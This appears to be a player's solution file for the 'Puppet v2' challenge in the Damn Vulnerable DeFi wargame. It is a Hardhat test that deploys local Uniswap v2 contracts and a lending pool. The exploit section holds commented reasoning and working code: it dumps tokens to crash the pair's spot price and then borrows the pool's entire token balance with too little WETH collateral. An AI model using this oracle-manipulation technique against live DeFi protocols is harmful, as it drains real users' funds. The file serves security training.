const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /**
         * Uniswap is based on the constant product formula X*Y = K
         * 
         * First step is to understand uniswap v2
         * 
         * uniswap pairs:
         * Pairs have two primary purposes: serving as automated market makers and keeping track of pool token balances. 
         * They also expose data which can be used to build decentralized price oracles.
         * function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
         * -returns reserves of token 0 and token 1 used to price trade and distribute liquidity. Also returns the block.timestamp(mod2**32) of the last block during whic
         *  an interaction occured for the pair
         * 
         * UniswapLibray :
         * The library provides a variety of convenience functions for fetching data and pricing.
         * function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB);
         * -Calls getReserves on the pair for the passed tokens, and returns the results sorted in the order that the parameters were passed in.
         * function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB);
         * -Given some asset amount and reseveres, returns an amount of other asset representing equivalent value
         * Returns price of tokens
         * 
         * Understand how swaps work, i.e. how to swap tokens
         * Uniswap Routers:
         * The router, which uses the library, fully supports all the basic requirements of a front-end offering trading and liquidity management functionality. 
         * Notably, it natively supports multi-pair trades (e.g. x to y to z), treats ETH as a first-class citizen, and offers meta-transactions for removing liquidity.
         * 
         * uniswaprouter02 to do swap tokens
         * function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
         * 
         * 2nd step what is the difference between uniswapv2 and uniswapv1:
         * Its just harder to manipulate the prices and uniswapv2 is not a systems of contracts
         * y measuring and recording the price before the first trade of each block (or equivalently, after the last trade of the previous
         * block). This price is more difficult to manipulate than prices during a block. If the attacker
         * submits a transaction that attempts to manipulate the price at the end of a block, some
         * other arbitrageur may be able to submit another transaction to trade back immediately
         * afterward in the same block. A miner (or an attacker who uses enough gas to fill an entire
         * block) could manipulate the price at the end of a block, but unless they mine the next block
         * as well, they may not have a particular advantage in arbitraging the trade back.
         * 
         * 3rd step manipulate the price of the quotations
         * Usage of the uniswaprouter to do that
         * 
         * 
         * 
         * Calculation:
         * Attacker 20eth 10000 tokens
         * Initial token = 100; Initial weth 10eth;
         * K = 1000
         * fee of 0.3%
         * add 10000tkns means 9970 add 30tkns used for fees
         * new tkn amt = 9970+ 100 100070
         * eth price left = 1000 / (9970 + 100) = 0.099304
         * Buyer receiver 10 - 0.099304 = 9.900695
         * ether_pool = 0.099304
         * DVT_POOL = 10100
         * K = 9940.41
         * 
         * ether price = 0.099304/10100 = 0.0000098321
         * 1 millino tokens * 0.0000098321 = 9.832 eth
         * so 9.832 * 3 = 29.496 eth required approximatedly 30 eth
         * 
         */

        //Documentation to trade from a smart contract
        //https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/trading-from-a-smart-contract

        // Idk if i should use the pair's swap function or router's swapExactETHForTokens function
        //But pair's swap function requires some sort of calldata which is not specifically mentioned in the documentation

        //  function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline), to is the recipient of the output tkn.
        //  external
        //  payable
        //  returns (uint[] memory amounts);

        // function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        // external
        // returns (uint[] memory amounts);
        // How to determine the path?
        // See the doucmentation in line 148;


        /**
         * Steps to using UNISWAP V2;
         * 1.Transferfrom attacker address to the specific contract you created
         * 2.approve the uniswap router to use the tokenin the contract
         * 3. the swap function 
         * 
         */

        // console.log(attacker.address);
        const deadline = (await ethers.provider.getBlock()).timestamp *25;
        const tknBal = await this.token.balanceOf(attacker.address);
        const attackerConnectTkn = this.token.connect(attacker);
        await attackerConnectTkn.approve(this.uniswapRouter.address,ATTACKER_INITIAL_TOKEN_BALANCE);
        const attackConnectRouter = this.uniswapRouter.connect(attacker);
        await attackConnectRouter.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE,1,[this.token.address,this.weth.address],attacker.address,deadline);

        /**
         * Steps to using the lendingpool's borrow function
         */
        //They only thing i did wrong was that i did not CONVERT my ETH to WETH;
        //So we need to depositi eth to the canonical WETH contract to get WETh

        //Calculate weth needed to borrow all the pool's tokens
        const attackerConnectedpool = this.lendingPool.connect(attacker);
        const wethNeeded = await attackerConnectedpool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);


        // Converting attacker's ETH to WETH , so essentially i was stucked here for 2 days of thinkgin because i did not do this step;
        const attackerConnectWeth = this.weth.connect(attacker);
        await attackerConnectWeth.deposit({value:wethNeeded})
        await attackerConnectWeth.approve(this.lendingPool.address,wethNeeded);

        //Borrowing 
        await attackerConnectedpool.borrow(POOL_INITIAL_TOKEN_BALANCE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});